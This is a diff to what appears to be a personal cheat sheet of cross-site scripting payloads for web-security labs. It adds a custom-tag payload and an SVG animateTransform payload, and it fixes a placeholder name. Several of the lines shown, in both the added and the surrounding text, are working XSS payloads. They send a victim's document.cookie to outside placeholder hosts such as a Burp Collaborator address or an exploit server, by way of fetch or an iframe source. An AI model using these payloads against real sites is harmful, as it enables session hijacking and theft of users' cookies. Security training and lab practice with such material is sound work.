@@ -22,7 +22,7 @@
 ## Walkthrough - Most Important Labs
 
 - [POC - HOW TO FIND DOM XSS WITH DOM INVADER](DOM-INTRUDER.md) 👀
-- [XSS Reflected - how to find tags and attributed blocked and WAF bypass](tags-and-attributed-blockec-waf-bypass.md) 👀
+- [XSS Reflected - how to find tags and attributed blocked and WAF bypass + extra: customtags](tags-and-attributed-blockec-waf-bypass.md) 👀
  
 - [DOM XSS in document.write sink using source location.search - SVG TAG](dom-xss-sink-source-svg.md)
 - [DOM XSS in jQuery using onhashchange event # ](dom-xss-jquery-onhashchange.md) 🔥
@@ -68,6 +68,9 @@ Repeat the same procedure with the target victim
 ' + alert(1) + '
 javascript:alert(0)
 
+//custom tag
+<custom-tag onfocus="alert(1)" id="x" tabindex="1"> -> in the end of url add #x to reference the custom tag
+
 
 //angularJS
 {{constructor.constructor('alert(1)')()}}
@@ -91,8 +94,12 @@ javascript:alert(0)
 
 <iframe src="<IP>/?cookie='+btoa(document.cookie))" onload=<img src=1 onerror=alert(1)> hidden="hidden"</iframe>
 
-<script>fetch(`https://<BURP-COLAB>.net`, {method: ‘POST’,mode: ‘no-cors’,body:document.cookie});</script>
+<script>fetch(`https://<BURP-COLLAB>.net`, {method: ‘POST’,mode: ‘no-cors’,body:document.cookie});</script>
 <script>fetch(`https://<EXPLOIT-SV>.net`, {method: ‘POST’,mode: ‘no-cors’,body:document.cookie});</script>
+
+<svg><animateTransform onbegin=fetch('https://<BURP-COLLAB>?cookie='+btoa(document.cookie))>
+
+
 
 // tags / atributtes blacklisted
 <iframe
